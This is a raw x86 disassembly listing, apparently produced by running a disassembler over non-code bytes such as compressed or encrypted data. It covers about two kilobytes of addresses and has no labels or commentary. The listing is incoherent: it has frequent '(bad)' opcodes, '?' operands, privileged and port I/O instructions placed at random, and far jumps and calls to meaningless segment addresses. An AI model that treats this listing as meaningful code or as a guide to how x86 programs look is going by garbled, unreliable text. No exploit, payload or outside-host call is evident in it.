  698449:	(bad)  
  69844a:	mov    ebp,0xdeabb78d
  69844f:	push   ds
  698450:	push   edx
  698451:	pop    ecx
  698452:	aam    0x29
  698454:	xchg   edi,eax
  698455:	or     ebp,eax
  698457:	and    DWORD PTR [ebx],edx
  698459:	push   cs
  69845a:	popf   
  69845b:	or     ecx,esi
  69845d:	cli    
  69845e:	xchg   ecx,eax
  69845f:	jg     0x69846d
  698461:	(bad)  
  698462:	sbb    esp,DWORD PTR ds:0xaf310f98
  698468:	add    eax,0x6767ea00
  69846d:	and    bl,BYTE PTR [ebp-0x75]
  698470:	ins    DWORD PTR es:[edi],dx
  698471:	and    eax,0x91ee02a3
  698476:	adc    eax,0x8b718083
  69847b:	sbb    al,0xc2
  69847d:	xor    bl,dh
  69847f:	pop    es
  698480:	aas    
  698481:	pop    esi
  698482:	fbld   TBYTE PTR [eax-0x4ea138f]
  698488:	pop    ds
  698489:	aaa    
  69848a:	or     cl,BYTE PTR [eax-0x3a1a13fb]
  698490:	aas    
  698491:	jge    0x69841d
  698493:	jbe    0x6984f2
  698495:	inc    esi
  698496:	fcomp  DWORD PTR [ebp-0x7676a28b]
  69849c:	jno    0x6984a5
  69849e:	rcl    BYTE PTR [ecx+ebx*2],1
  6984a1:	xor    esi,DWORD PTR [esi+eax*2-0x3a11f4f7]
  6984a8:	aas    
  6984a9:	push   cs
  6984aa:	(bad)  
  6984ab:	aad    0x2
  6984ad:	pop    es
  6984ae:	add    al,0x22
  6984b0:	cmp    eax,DWORD PTR [ebx+0x19]
  6984b3:	pop    ss
  6984b4:	ret    0xa880
  6984b7:	fsubr  st,st(5)
  6984b9:	push   esp
  6984ba:	gs add eax,0x60ed74c0
  6984c0:	sahf   
  6984c1:	ja     0x698533
  6984c3:	pop    edi
  6984c4:	rcr    BYTE PTR [ecx],1
  6984c6:	pop    ds
  6984c7:	xchg   ecx,eax
  6984c8:	fwait
  6984c9:	cwde   
  6984ca:	mov    cl,0x77
  6984cc:	or     eax,0x81d2dc80
  6984d1:	inc    ecx
  6984d2:	add    al,BYTE PTR [eax+edi*4+0xd63449d]
  6984d9:	adc    al,0x5e
  6984db:	mov    ah,0x8c
  6984dd:	in     al,dx
  6984de:	mov    esp,0x2ca8d166
  6984e3:	mov    ch,0x17
  6984e5:	pushf  
  6984e6:	nop
  6984e7:	hlt    
  6984e8:	mov    eax,ecx
  6984ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6984eb:	in     al,dx
  6984ec:	jbe    0x6984e7
  6984ee:	shl    BYTE PTR [edx],1
  6984f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6984f1:	dec    esp
  6984f2:	cmp    bh,bl
  6984f4:	jns    0x698505
  6984f6:	sbb    al,0xcd
  6984f8:	xchg   esp,eax
  6984f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6984fa:	mov    ah,0x84
  6984fc:	mov    eax,0xfe51112
  698501:	das    
  698502:	push   ebx
  698503:	jb     0x69854a
  698505:	in     al,0x28
  698507:	inc    edx
  698508:	sti    
  698509:	out    dx,eax
  69850a:	sbb    ch,BYTE PTR [esi-0x14c9ca7c]
  698510:	jns    0x6984dc
  698512:	vmptrst QWORD PTR [edi-0x37e21263]
  698519:	dec    ebx
  69851a:	pop    ecx
  69851b:	jle    0x6984eb
  69851d:	or     eax,0x3769542c
  698522:	into   
  698523:	pop    ecx
  698524:	inc    esi
  698525:	sub    al,dl
  698527:	xor    al,0x60
  698529:	mov    bl,0x99
  69852b:	pop    ebp
  69852c:	mov    esi,0xf0de8b00
  698531:	int    0xa8
  698533:	sub    DWORD PTR [eax+0x33e50945],eax
  698539:	leave  
  69853a:	sti    
  69853b:	sub    eax,0x1f5eae7
  698540:	int    0x2e
  698542:	sub    BYTE PTR [esi+0x39],dl
  698545:	std    
  698546:	test   al,0xac
  698548:	out    0xa,al
  69854a:	mov    edx,0xa732e8bf
  69854f:	arpl   WORD PTR gs:[ecx],di
  698552:	and    al,0x25
  698554:	inc    ecx
  698555:	mov    BYTE PTR [si],bh
  698558:	mov    dl,0x98
  69855a:	inc    ebx
  69855b:	fsubr  DWORD PTR [edi+0x14]
  69855e:	cs push es
  698560:	and    al,0x32
  698562:	xor    DWORD PTR [eax+0x306ee06e],edx
  698568:	(bad)  
  698569:	daa    
  69856a:	mov    eax,ds:0xf4940613
  69856f:	into   
  698570:	ja     0x6985ee
  698572:	add    bh,bl
  698574:	aad    0x4
  698576:	sub    eax,0x98ded057
  69857b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69857c:	mov    al,ds:0xc35bb8c8
  698581:	or     bl,BYTE PTR [edi-0x1dac9c9c]
  698587:	xchg   esi,eax
  698588:	(bad)  
  69858a:	popf   
  69858b:	ss inc edx
  69858d:	cmp    al,0xd1
  69858f:	jmp    0x1cf54c28
  698594:	sub    DWORD PTR [eax+0x78],edx
  698597:	sub    BYTE PTR [edi-0x45],ch
  69859a:	mov    dh,0x50
  69859c:	ror    DWORD PTR [ebp+0x42],0xc
  6985a0:	jg     0x698580
  6985a2:	sub    ecx,esi
  6985a4:	mov    ds:0x2594a7d4,al
  6985a9:	jecxz  0x698608
  6985ab:	stc    
  6985ac:	outs   dx,DWORD PTR ds:[esi]
  6985ad:	stos   BYTE PTR es:[edi],al
  6985ae:	popa   
  6985af:	lea    ebx,[edi+esi*4-0x4b9d96f4]
  6985b6:	fbstp  TBYTE PTR [ecx+0x29]
  6985b9:	and    al,0xaf
  6985bb:	adc    bl,BYTE PTR [edi+0x55a16e17]
  6985c1:	sar    bl,0xbc
  6985c4:	hlt    
  6985c5:	sbb    al,0x5f
  6985c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6985c8:	(bad)  
  6985c9:	mov    al,ds:0x670c30ec
  6985ce:	sti    
  6985cf:	xchg   ebp,eax
  6985d0:	addr16 mov dl,0xf0
  6985d3:	lock pop edi
  6985d5:	imul   edi,ebp,0xffffffc2
  6985d8:	or     DWORD PTR [ebx+0x6f],ecx
  6985db:	sbb    BYTE PTR [eiz*2+0x29f5ff14],ch
  6985e2:	push   ss
  6985e3:	pusha  
  6985e4:	bsf    eax,DWORD PTR [esi+0x1e]
  6985e8:	jg     0x698643
  6985ea:	in     eax,dx
  6985eb:	addr16 xchg edi,eax
  6985ed:	jl     0x6985fa
  6985ef:	and    DWORD PTR [ecx],0x1841b797
  6985f5:	mov    WORD PTR [edx+0x4857d41f],cs
  6985fb:	mov    dl,0x3a
  6985fd:	xor    ebp,DWORD PTR [esi]
  6985ff:	aas    
  698600:	dec    esp
  698601:	stc    
  698602:	sub    al,0xd6
  698604:	cdq    
  698605:	dec    ecx
  698606:	xchg   ecx,eax
  698607:	ja     0x698604
  698609:	sahf   
  69860a:	inc    edx
  69860b:	(bad)  
  69860c:	repnz mov esp,0x8471720
  698612:	aaa    
  698613:	cmp    ebp,DWORD PTR [eax-0x22]
  698616:	push   es
  698617:	pop    es
  698618:	sub    esp,DWORD PTR [esp+eiz*4]
  69861b:	xchg   ecx,eax
  69861c:	mov    dl,0x9b
  69861e:	inc    edx
  69861f:	adc    al,0xaa
  698621:	mov    DWORD PTR [edi+edi*8-0x7c],esp
  698625:	cdq    
  698626:	xor    BYTE PTR [esi-0x26],0x15
  69862a:	mov    ecx,0xb17018ed
  69862f:	ret    
  698630:	mov    esp,0x708e9e25
  698635:	mov    bl,0x69
  698637:	xor    al,0xc3
  698639:	fwait
  69863a:	into   
  69863b:	push   edi
  69863c:	pop    eax
  69863d:	lods   eax,DWORD PTR ds:[esi]
  69863e:	push   cs
  69863f:	sbb    ah,BYTE PTR [edx]
  698641:	xlat   BYTE PTR ds:[ebx]
  698642:	pop    ss
  698643:	fcom   st(6)
  698645:	mov    ah,0x1a
  698647:	(bad)  
  698648:	rol    DWORD PTR ds:0xa13a08de,cl
  69864e:	and    cl,BYTE PTR [edi]
  698650:	shr    esi,1
  698652:	js     0x698638
  698654:	ss mov ebp,0x662b2bb0
  69865a:	in     eax,dx
  69865b:	cmc    
  69865c:	mov    dl,0x5
  69865e:	cld    
  69865f:	fmul   DWORD PTR [edx]
  698661:	xchg   ebp,eax
  698662:	jns    0x69868f
  698664:	ror    DWORD PTR [eax],1
  698666:	or     eax,0x2ba0a2aa
  69866b:	pusha  
  69866c:	in     al,dx
  69866d:	sub    BYTE PTR [eax+0xa],0x24
  698671:	out    dx,al
  698672:	mov    al,0x12
  698674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  698675:	jg     0x69865d
  698677:	xor    esi,DWORD PTR ss:0x884c35e4
  69867e:	(bad)  
  69867f:	mov    esi,0x8c22e3ae
  698684:	sbb    dh,BYTE PTR [ebx+0x333a7b20]
  69868a:	imul   ebx,DWORD PTR [ebp+0x66],0xffffff90
  69868e:	fcomp  QWORD PTR [ebp+0x18]
  698691:	sti    
  698692:	mov    BYTE PTR [ebp-0x5657da57],dh
  698698:	push   DWORD PTR ds:[ebp-0x406e2680]
  69869f:	test   al,0x26
  6986a1:	add    dh,BYTE PTR [eax]
  6986a3:	pushf  
  6986a4:	xchg   esp,eax
  6986a5:	repnz les ecx,FWORD PTR [esi]
  6986a8:	sbb    ecx,DWORD PTR [eax]
  6986aa:	sub    eax,0x5962aad8
  6986af:	retf   
  6986b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6986b1:	pop    edx
  6986b2:	fldl2t 
  6986b4:	out    dx,al
  6986b5:	cmp    BYTE PTR [edi+0x1b],cl
  6986b8:	add    bl,BYTE PTR [ecx]
  6986ba:	dec    ecx
  6986bb:	xlat   BYTE PTR ds:[ebx]
  6986bc:	scas   eax,DWORD PTR es:[edi]
  6986bd:	pop    edx
  6986be:	mov    WORD PTR [ebx],cs
  6986c0:	sbb    eax,0xe7d84972
  6986c5:	xchg   esp,eax
  6986c6:	imul   ebx,DWORD PTR [edx-0x514c16e4],0xffffff9d
  6986cd:	in     eax,dx
  6986ce:	sub    eax,0xcadd0505
  6986d3:	div    eax
  6986d5:	jb     0x6986c7
  6986d7:	out    0x45,eax
  6986d9:	xchg   ecx,eax
  6986da:	test   DWORD PTR [ecx-0x5784a047],edi
  6986e0:	jo     0x69871d
  6986e2:	adc    BYTE PTR [esi+eiz*1],0x23
  6986e6:	add    eax,0x4f4571b5
  6986eb:	dec    edi
  6986ec:	sub    al,0x9c
  6986ee:	loop   0x698709
  6986f0:	shr    DWORD PTR [ebp+0x6ab66f3a],cl
  6986f6:	test   DWORD PTR [edi],edx
  6986f8:	mov    esp,0xd2129a34
  6986fd:	lods   al,BYTE PTR ds:[esi]
  6986fe:	sub    DWORD PTR [ecx],eax
  698700:	call   0x4606:0x74b5350
  698707:	mov    edi,0xbcb5664a
  69870c:	mov    esp,0xd2c06e61
  698711:	adc    al,0x55
  698713:	xchg   esi,eax
  698714:	jno    0x698752
  698716:	stc    
  698717:	and    esp,esp
  698719:	retf   0x5910
  69871c:	push   esp
  69871d:	push   edx
  69871e:	iret   
  69871f:	push   esi
  698720:	icebp  
  698721:	call   0x8c927220
  698726:	xor    DWORD PTR [esi+0x6e11d6c5],0x164b9345
  698730:	retf   0x4cb6
  698733:	pop    eax
  698734:	mov    dh,0xee
  698736:	mov    al,ds:0x4fc71fd9
  69873b:	pushf  
  69873c:	inc    edx
  69873d:	and    BYTE PTR [eax+0xa07179b],ah
  698743:	in     al,dx
  698744:	jecxz  0x69879d
  698746:	cmp    BYTE PTR [eax+eiz*8],0x2a
  69874a:	fcom   QWORD PTR [ebx+0x2247b399]
  698750:	mov    ebx,0x2749a788
  698755:	add    ebx,DWORD PTR [eax]
  698757:	fcmovnb st,st(1)
  698759:	stos   DWORD PTR es:[edi],eax
  69875a:	mov    ecx,0x2877dc05
  69875f:	repnz test al,0xd1
  698762:	sub    ax,bp
  698765:	adc    BYTE PTR [eax+0x4a],al
  698768:	push   ebx
  698769:	inc    ebp
  69876a:	scas   eax,DWORD PTR es:[edi]
  69876b:	fcomp  DWORD PTR [edi-0x5d501f07]
  698771:	xchg   edx,eax
  698772:	pushf  
  698773:	nop
  698774:	xchg   bl,al
  698776:	sti    
  698777:	imul   esi,DWORD PTR [eax+edi*2],0xd4d509d
  69877e:	pop    ecx
  69877f:	mov    edi,0x9955a6b
  698784:	jmp    0x6bdbae3e
  698789:	lock stos DWORD PTR es:[edi],eax
  69878b:	test   eax,0xba629e86
  698790:	out    dx,al
  698791:	dec    ebx
  698792:	add    dl,BYTE PTR [eax+0x32fc4d7a]
  698798:	and    al,0xc3
  69879a:	(bad)  
  69879c:	fild   WORD PTR [eax+0x5a]
  69879f:	or     ch,BYTE PTR [esi+esi*4-0x2c970182]
  6987a6:	(bad)  
  6987a7:	mov    ah,0x6a
  6987a9:	call   0xd21a:0x8ccb3cdd
  6987b0:	jo     0x6987a4
  6987b2:	push   ebx
  6987b3:	dec    ecx
  6987b4:	sub    eax,0x6dae63ee
  6987b9:	sub    eax,0xd88b3be9
  6987be:	out    0xce,eax
  6987c0:	xlat   BYTE PTR ds:[ebx]
  6987c1:	scas   eax,DWORD PTR es:[edi]
  6987c2:	push   cs
  6987c3:	push   ecx
  6987c4:	icebp  
  6987c5:	(bad)  
  6987c6:	jnp    0x6987fb
  6987c8:	(bad)  
  6987c9:	jo     0x698764
  6987cb:	ret    0xac3d
  6987ce:	push   ebp
  6987cf:	test   eax,0x8098ba24
  6987d4:	ror    BYTE PTR [ebx-0x1d],0xf7
  6987d8:	xchg   edi,eax
  6987d9:	or     BYTE PTR [esi-0x4c],dl
  6987dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6987dd:	push   esi
  6987de:	repnz or cl,BYTE PTR [ecx]
  6987e1:	mov    ah,0xbc
  6987e3:	popf   
  6987e4:	arpl   si,si
  6987e6:	cwde   
  6987e7:	(bad)  
  6987e8:	iret   
  6987e9:	push   es
  6987ea:	rcl    BYTE PTR [eax-0x4cfe84c5],1
  6987f0:	inc    ebp
  6987f1:	test   eax,0x457142e6
  6987f6:	jbe    0x698864
  6987f8:	cld    
  6987f9:	jmp    FWORD PTR [bp+si-0x72]
  6987fd:	and    al,BYTE PTR [edi]
  6987ff:	loopne 0x6987e6
  698801:	jl     0x698793
  698803:	sbb    eax,0xb6590556
  698808:	cmp    cl,ah
  69880a:	jge    0x6987af
  69880c:	lar    edx,WORD PTR ds:0x602cca2f
  698813:	fst    QWORD PTR [edi]
  698815:	mov    edx,0xb2455875
  69881a:	mov    WORD PTR [esi],?
  69881c:	retf   
  69881d:	je     0x698892
  69881f:	loop   0x6987b0
  698821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  698822:	cmp    ebp,DWORD PTR [esi]
  698824:	and    BYTE PTR [eax-0x655239d7],dl
  69882a:	adc    esp,0x65b0d3a5
  698830:	xor    eax,0xeb078d3f
  698835:	mov    ch,0xb8
  698837:	mov    BYTE PTR [esp+eiz*2],al
  69883a:	lahf   
  69883b:	mov    WORD PTR [edx-0x5a],?
  69883e:	jns    0x698824
  698840:	ret    0xa4a
  698843:	ins    DWORD PTR es:[edi],dx
  698844:	adc    eax,0xc7dc04e0
  698849:	sbb    al,0x43
  69884b:	cmp    dh,0x5b
  69884e:	sahf   
  69884f:	cs jl  0x6987d5
  698852:	clc    
  698853:	test   DWORD PTR [ebp-0x442df619],edi
  698859:	sub    eax,0xe4d07cab
  69885e:	aas    
  69885f:	bound  eax,QWORD PTR [edx+ebx*2]
  698862:	adc    al,0xc9
  698864:	or     dl,BYTE PTR [ebx+0x41]
  698867:	les    edi,FWORD PTR [edi+edx*1+0x7e]
  69886b:	stc    
  69886c:	xor    edi,DWORD PTR [ebx+0x27d6144a]
  698872:	in     eax,0xd3
  698874:	push   esi
  698875:	lods   al,BYTE PTR ds:[esi]
  698876:	mov    ds:0xa90160c4,al
  69887b:	mov    ds:0x35fda9b5,al
  698880:	pop    ds
  698881:	lds    esi,FWORD PTR [ebx-0x43]
  698884:	repnz push ebp
  698886:	in     al,dx
  698887:	dec    edi
  698888:	xor    eax,0x292c6794
  69888d:	daa    
  69888e:	cmp    edi,ebx
  698890:	mov    eax,0x6818602d
  698895:	push   cs
  698896:	andnps xmm0,XMMWORD PTR [ecx-0x4d]
  69889a:	add    DWORD PTR [edx],eax
  69889c:	imul   esi,DWORD PTR [esi-0x28ef2fbc],0x50
  6988a3:	ins    BYTE PTR es:[edi],dx
  6988a4:	in     eax,dx
  6988a5:	push   ebp
  6988a6:	xchg   ecx,eax
  6988a7:	or     eax,0x658b814d
  6988ac:	inc    esp
  6988ad:	sbb    BYTE PTR [edx],0x85
  6988b0:	jg     0x69888f
  6988b2:	adc    eax,0x278c00fd
  6988b7:	jge    0x6988a4
  6988b9:	repz cld 
  6988bb:	xor    bl,dl
  6988bd:	mov    dl,0xde
  6988bf:	sub    eax,0x49a1e96a
  6988c4:	in     al,0x9f
  6988c6:	jmp    0x6988f2
  6988c8:	int    0x7f
  6988ca:	pop    edx
  6988cb:	stc    
  6988cc:	hlt    
  6988cd:	pop    edx
  6988ce:	and    cl,BYTE PTR [ebp+0x3a86b618]
  6988d4:	pop    es
  6988d5:	das    
  6988d6:	adc    eax,0x5d6cf5af
  6988db:	imul   eax,DWORD PTR [esi+0x68],0x28e318ec
  6988e2:	adc    BYTE PTR [ebp+0x2c815a0f],bh
  6988e8:	lock popf 
  6988ea:	push   ds
  6988eb:	jmp    0x36ce:0xe0636344
  6988f2:	jae    0x698954
  6988f4:	fst    QWORD PTR [ecx+0x78d5d520]
  6988fa:	jbe    0x6988d2
  6988fc:	mov    ebx,0x36eb685c
  698901:	dec    edx
  698902:	cli    
  698903:	sub    bl,dh
  698905:	xor    dh,bh
  698907:	call   0x63d7:0x1b58c726
  69890e:	cdq    
  69890f:	inc    edi
  698910:	fcmovb st,st(7)
  698912:	or     al,0xda
  698914:	push   edi
  698915:	call   0xb910b05a
  69891a:	or     ch,al
  69891c:	mov    eax,0xcefd1154
  698921:	cmp    DWORD PTR [ebp-0x28a242a8],edi
  698927:	fild   WORD PTR [edi-0x6a]
  69892a:	in     eax,0x9c
  69892c:	sbb    bl,bh
  69892e:	leave  
  69892f:	mov    ds:0x46d2471a,al
  698934:	pop    esp
  698935:	into   
  698936:	jecxz  0x6989b4
  698938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  698939:	lahf   
  69893a:	xchg   DWORD PTR [ecx+0x70],esi
  69893d:	jo     0x6988dd
  69893f:	shl    BYTE PTR ds:0xfc476ddb,1
  698945:	jnp    0x698936
  698947:	or     BYTE PTR [edi-0x50409038],cl
  69894d:	and    DWORD PTR [ecx+0x19b80cef],0xd
  698954:	mov    dh,0x95
  698956:	cmp    eax,0x1c08e50a
  69895b:	push   edi
  69895c:	xchg   ebx,eax
  69895d:	imul   edx,esi,0xffffff81
  698960:	imul   esi,DWORD PTR [ebx-0x4bdbd674],0x467f2f4e
  69896a:	mov    bl,0xc6
  69896c:	add    DWORD PTR [edx],ebp
  69896e:	mov    ?,WORD PTR [ebp-0x1c0e1cc9]
  698974:	mov    eax,0x980c5013
  698979:	lea    ecx,[edi+0x22]
  69897c:	ss inc ebx
  69897e:	out    dx,al
  69897f:	adc    dl,bl
  698981:	imul   edx,DWORD PTR [ecx],0x5082f055
  698987:	jmp    0xe09a:0xd54150c3
  69898e:	xchg   edi,eax
  69898f:	xor    BYTE PTR [ebp-0x61739098],ah
  698995:	call   0x9b0870db
  69899a:	(bad)  
  69899b:	pop    ebx
  69899c:	or     DWORD PTR [esi-0x56b8fb5e],esi
  6989a2:	mov    edx,0xbf1b31a4
  6989a7:	jno    0x6989b9
  6989a9:	das    
  6989aa:	retf   
  6989ab:	dec    eax
  6989ac:	repz ja 0x698a2d
  6989af:	sahf   
  6989b0:	inc    ecx
  6989b1:	push   edi
  6989b2:	test   eax,0x9c35b5e3
  6989b7:	clc    
  6989b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6989b9:	(bad)  
  6989ba:	mov    BYTE PTR [eax+ecx*4-0x471ea5fe],al
  6989c1:	in     eax,0x54
  6989c3:	push   cs
  6989c4:	pop    eax
  6989c5:	jle    0xceffd451
  6989cb:	out    dx,al
  6989cc:	adc    eax,0x7f4f68c3
  6989d1:	pop    ecx
  6989d2:	mov    ebx,0x2ffd5c06
  6989d7:	jmp    0x4a92:0x5a7e1731
  6989de:	or     eax,0x5e8b9bea
  6989e3:	pop    ebx
  6989e4:	xor    eax,0x579ece2c
  6989e9:	aad    0x3b
  6989eb:	call   0x1fb2:0x5d7d5448
  6989f2:	scas   al,BYTE PTR es:[edi]
  6989f3:	mov    dh,0xa9
  6989f5:	outs   dx,DWORD PTR ds:[esi]
  6989f6:	cmp    ebx,DWORD PTR [esi+0x5b0e769b]
  6989fc:	aam    0xaf
  6989fe:	js     0x6989a8
  698a00:	mov    ds:0xa30eb70d,eax
  698a05:	push   edx
  698a06:	test   BYTE PTR [edi-0x6c],al
  698a09:	cdq    
  698a0a:	push   0x5a
  698a0c:	lds    ecx,FWORD PTR [edx-0x17942bf0]
  698a12:	and    DWORD PTR [edx+0x29b72146],edi
  698a18:	xchg   esp,eax
  698a19:	and    bl,BYTE PTR [ebp-0x5c3ee07f]
  698a1f:	imul   edx,DWORD PTR [ebx-0x1859143e],0xffffffbe
  698a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  698a27:	inc    esi
  698a28:	jge    0x6989ac
  698a2a:	add    cl,BYTE PTR [bx-0x2]
  698a2e:	les    edx,FWORD PTR [ecx+0x51]
  698a31:	fistp  WORD PTR [edi]
  698a33:	inc    ebx
  698a34:	mov    al,0xd
  698a36:	add    bh,BYTE PTR [ebx+edi*8-0x5f]
  698a3a:	neg    BYTE PTR [esi+ebp*4]
  698a3d:	push   ss
  698a3e:	xor    DWORD PTR [bp+si],esi
  698a41:	cld    
  698a42:	xor    eax,0xa9997a84
  698a47:	call   0x1935:0x3e2f967f
  698a4e:	mov    edx,0xd42537e5
  698a53:	or     edx,DWORD PTR [ebx+0x3b6fc4ae]
  698a59:	sub    DWORD PTR [eax],ecx
  698a5b:	aaa    
  698a5c:	cmp    eax,0x7012190c
  698a61:	inc    ebp
  698a62:	int    0xc0
  698a64:	cwde   
  698a65:	into   
  698a66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  698a67:	sbb    eax,0x8e5e57fd
  698a6c:	or     ch,BYTE PTR [edx-0x13]
  698a6f:	cmp    al,0x59
  698a71:	mov    eax,ds:0x4a1f8987
  698a76:	mov    ebp,0x8c8e5dc2
  698a7b:	mov    esp,0x643cd825
  698a80:	xchg   ebp,eax
  698a81:	sti    
  698a82:	push   cs
  698a83:	retf   
  698a84:	pusha  
  698a85:	or     edx,DWORD PTR [eax]
  698a87:	push   es
  698a88:	mov    BYTE PTR [ebp+0x30],dh
  698a8b:	pop    eax
  698a8c:	les    eax,FWORD PTR [esi+eax*8]
  698a8f:	lods   al,BYTE PTR ds:[esi]
  698a90:	adc    esp,ecx
  698a92:	jns    0x698b0d
  698a94:	lods   eax,DWORD PTR ds:[esi]
  698a95:	push   edx
  698a96:	xchg   edi,eax
  698a97:	test   BYTE PTR [edx+ebp*1+0x4c],ah
  698a9b:	xchg   BYTE PTR [edx+0x3d],dl
  698a9e:	xor    cl,ch
  698aa0:	aas    
  698aa1:	inc    esp
  698aa2:	ss out 0x1e,al
  698aa5:	sub    dl,dl
  698aa7:	imul   edi,DWORD PTR [edx-0x79],0x321a4795
  698aae:	(bad)  
  698aaf:	pop    ebx
  698ab0:	sub    eax,0x3f1a0593
  698ab5:	loopne 0x698a7a
  698ab7:	mul    BYTE PTR [ecx-0x580278ae]
  698abd:	mov    eax,ds:0x847f06f4
  698ac2:	and    dh,BYTE PTR [eax-0x49]
  698ac5:	outs   dx,DWORD PTR ds:[esi]
  698ac6:	or     ebx,eax
  698ac8:	push   ds
  698ac9:	or     DWORD PTR [ebp+0x3c],0x5726cc4b
  698ad0:	iret   
  698ad1:	ins    DWORD PTR es:[edi],dx
  698ad2:	sbb    DWORD PTR [edx+0x66],0xba5404c4
  698ad9:	pop    eax
  698ada:	mov    ds:0x3ab221f2,eax
  698adf:	or     BYTE PTR [esi],bh
  698ae1:	cmp    BYTE PTR [ebp-0x2e],dh
  698ae4:	xor    BYTE PTR [eax-0x4119fbcf],0xb0
  698aeb:	sbb    DWORD PTR [esi+0x4d43f626],esp
  698af1:	lea    edx,[edx]
  698af3:	dec    edx
  698af4:	test   al,0x65
  698af6:	cmp    ah,BYTE PTR [ecx+0x4f]
  698af9:	mov    ecx,0x932c39fb
  698afe:	mov    ebx,0x49ba147d
  698b03:	sbb    al,0xe6
  698b05:	cmp    edi,ecx
  698b07:	pop    eax
  698b08:	out    0xcd,al
  698b0a:	(bad)  
  698b0b:	aam    0x71
  698b0d:	jb     0x698a90
  698b0f:	lods   al,BYTE PTR ds:[esi]
  698b10:	fs ja  0x698afb
  698b13:	mov    ah,0xa7
  698b15:	pushf  
  698b16:	fsubr  QWORD PTR [edi-0x52e99f0]
  698b1c:	cwde   
  698b1d:	cmp    cl,BYTE PTR [ecx]
  698b1f:	fucomip st,st(5)
  698b21:	adc    eax,0x387d43f7
  698b26:	sub    BYTE PTR ds:0xca98fe47,bl
  698b2c:	cmp    dh,BYTE PTR [esi+0x56e5fe14]
  698b32:	enter  0x77b1,0xe6
  698b36:	xchg   ecx,eax
  698b37:	pop    ecx
  698b38:	cdq    
  698b39:	mov    edi,0x6f5facd1
  698b3e:	xor    DWORD PTR [edi+0x288136f7],0x4ef17f29
  698b48:	dec    eax
  698b49:	in     eax,0xbc
  698b4b:	icebp  
  698b4c:	fld    TBYTE PTR [ecx+0x1b]
  698b4f:	pop    ds
  698b50:	push   esp
  698b51:	scas   al,BYTE PTR es:[edi]
  698b52:	push   ebx
  698b53:	adc    eax,DWORD PTR [edx]
  698b55:	loopne 0x698b34
  698b57:	cmp    al,0x96
  698b59:	add    esp,ebp
  698b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  698b5c:	stos   BYTE PTR es:[edi],al
  698b5d:	test   BYTE PTR [eax+0x8],0x26
  698b61:	fbstp  TBYTE PTR ds:0x9f760431
  698b67:	enter  0xc78,0x73
  698b6b:	and    DWORD PTR [esi+0x47],esp
  698b6e:	jle    0x698bd4
  698b70:	xchg   edx,eax
  698b71:	mov    eax,ds:0xf32075
  698b76:	ret    0x7ad7
  698b79:	jg     0x698bd3
  698b7b:	dec    edi
  698b7c:	sub    edi,esp
  698b7e:	push   esi
  698b7f:	inc    esi
  698b80:	push   0xd8136103
  698b85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  698b86:	or     DWORD PTR [ecx+0x72adb5cf],ebp
  698b8c:	frstor [ebx+0x2e]
  698b8f:	ins    BYTE PTR es:[edi],dx
  698b90:	pop    edx
  698b91:	dec    esp
  698b92:	xchg   ebx,eax
  698b93:	ror    bh,cl
  698b95:	inc    esp
  698b96:	outs   dx,BYTE PTR ds:[esi]
  698b97:	adc    edi,DWORD PTR [ebp-0x1bc8b0df]
  698b9d:	dec    ebx
  698b9e:	cmp    ebp,edx
  698ba0:	xchg   edx,eax
  698ba1:	sub    DWORD PTR [eax-0x62],ecx
  698ba4:	jecxz  0x698b2a
  698ba6:	mov    edx,0x14cc8ac6
  698bab:	js     0x698c2c
  698bad:	xchg   esi,eax
  698bae:	push   ss
  698baf:	addr16 xchg ebx,eax
  698bb1:	pop    es
  698bb2:	fist   DWORD PTR [edi+edi*4-0x47]
  698bb6:	das    
  698bb7:	mov    bl,0xa9
  698bb9:	lea    esp,[eax]
  698bbb:	dec    eax
  698bbc:	retf   0x2975
  698bbf:	scas   eax,DWORD PTR es:[edi]
  698bc0:	xor    al,cl
  698bc2:	leave  
  698bc3:	(bad)  
  698bc4:	jns    0x698bad
  698bc6:	sbb    DWORD PTR [edi],ecx
  698bc8:	das    
  698bc9:	outs   dx,BYTE PTR ds:[esi]
  698bca:	or     ch,0xdd
  698bcd:	nop
  698bce:	out    dx,eax
  698bcf:	(bad)  
  698bd0:	pop    ebp
  698bd1:	imul   edx,DWORD PTR [ebx],0xb95d63d9
  698bd7:	xchg   ebp,eax
  698bd8:	in     al,0x38
  698bda:	ds cmp al,0x4b
  698bdd:	or     eax,0x758b834d
  698be2:	into   
  698be3:	push   ecx
  698be4:	dec    eax
  698be5:	add    BYTE PTR [edx-0xb966016],dh
  698beb:	fnstcw WORD PTR [edx]
  698bed:	add    al,0xa3
  698bef:	ins    DWORD PTR es:[edi],dx
  698bf0:	xchg   edi,eax
  698bf1:	sar    BYTE PTR [ecx+0xf],1
  698bf4:	lds    ecx,FWORD PTR [ecx+eiz*4-0x106bf894]
  698bfb:	pop    edx
  698bfc:	mov    cl,0x90
  698bfe:	repz mov ds:0xd3aa0c42,eax
  698c04:	and    ah,BYTE PTR [edx+esi*1+0x3db15c91]
  698c0b:	jb     0x698c4f
  698c0d:	push   cs
  698c0e:	xchg   DWORD PTR [edx+0x18],ecx
  698c11:	dec    eax
  698c12:	ret    0xc2e3
  698c15:	or     BYTE PTR es:[ecx],al
  698c18:	sbb    bl,ah
  698c1a:	sbb    eax,0x7ed23de1
  698c1f:	cmp    DWORD PTR [esi],ecx
  698c21:	(bad)  [ebx+0x2f]
  698c24:	pop    edx
  698c25:	add    ebp,DWORD PTR [edx-0x2e]
  698c28:	aam    0xa9
  698c2a:	lds    edi,FWORD PTR [ebx+0x75]
  698c2d:	rcr    DWORD PTR [ebx+0x14],0x16
  698c31:	sbb    al,0x6f
  698c33:	add    edi,DWORD PTR [edi+0x74]
  698c36:	jle    0x698c97
  698c38:	and    BYTE PTR ds:0x317c36b0,cl
